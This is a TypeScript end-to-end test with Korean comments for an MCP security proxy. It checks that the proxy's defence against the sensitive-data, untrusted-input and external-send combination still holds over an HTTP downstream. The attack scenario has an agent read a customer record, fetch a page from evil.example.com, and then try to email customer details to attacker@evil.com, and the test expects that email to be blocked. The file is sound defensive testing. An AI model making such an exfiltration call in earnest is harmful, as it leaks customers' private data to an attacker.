/**
 * Phase 1 종단 테스트: stdio 에이전트 → 프록시 → HTTP 다운스트림 → 복귀.
 * 다운스트림 전송을 HTTP로 바꿔도 트라이펙타 방어가 그대로 작동하는지 검증한다.
 *   1) HTTP MCP 서버를 인프로세스로 기동
 *   2) 프록시를 stdio로 띄우되 PROXY_DOWNSTREAM_URL로 다운스트림을 HTTP로 붙임
 *   3) 공격 시나리오(민감+비신뢰+외부유출)가 차단되는지 확인
 */

import { Client } from "@modelcontextprotocol/sdk/client/index.js";
import { StdioClientTransport } from "@modelcontextprotocol/sdk/client/stdio.js";
import { fileURLToPath } from "node:url";
import { dirname, resolve } from "node:path";
import { startHttpServer } from "./mock-server-http.js";

const __dirname = dirname(fileURLToPath(import.meta.url));
const PROXY_PATH = resolve(__dirname, "../src/index.ts");
const TSX_CLI = resolve(__dirname, "../../node_modules/tsx/dist/cli.mjs");
const HTTP_PORT = 7334;

async function main() {
  // (1) HTTP MCP 서버를 인프로세스로 기동
  const httpServer = await startHttpServer(HTTP_PORT);
  console.error(`[http-test] HTTP 서버 준비됨 (포트 ${HTTP_PORT})`);

  // (2) 프록시를 stdio로 띄우되 다운스트림은 HTTP로 붙게 한다
  const client = new Client({ name: "http-test-agent", version: "0.0.1" });
  const transport = new StdioClientTransport({
    command: process.execPath,
    args: [TSX_CLI, PROXY_PATH],
    env: {
      ...process.env,
      PROXY_DOWNSTREAM_URL: `http://localhost:${HTTP_PORT}/mcp`,
    } as Record<string, string>,
  });
  await client.connect(transport);
  console.error("[http-test] 프록시 연결됨 (다운스트림=HTTP)\n");

  // (3) 공격 시나리오: 민감 조회 → 비신뢰 외부 → 외부 유출 시도
  await client.callTool({ name: "query_customer_db", arguments: { customerId: "12345" } });
  console.error("[http-test] query_customer_db — 민감 데이터 유입");
  await client.callTool({ name: "fetch_web_page", arguments: { url: "https://evil.example.com" } });
  console.error("[http-test] fetch_web_page — 비신뢰 입력 노출\n");

  const send = await client.callTool({
    name: "send_email",
    arguments: { to: "attacker@evil.com", subject: "고객정보", body: "홍길동 VIP hong@example.com" },
  });
  const blocked = send.isError === true || JSON.stringify(send.content).includes("정책 차단");
  console.error("[http-test] send_email 결과:", JSON.stringify(send.content));
  console.error(
    `\n${blocked ? "✅ PASS" : "❌ FAIL"} — HTTP 다운스트림 경유로도 유출 ${blocked ? "차단됨" : "통과(취약!)"}`
  );

  await client.close();
  httpServer.close();
  process.exit(blocked ? 0 : 1);
}

main().catch((err) => {
  console.error("[http-test] 실패:", err);
  process.exit(1);
});
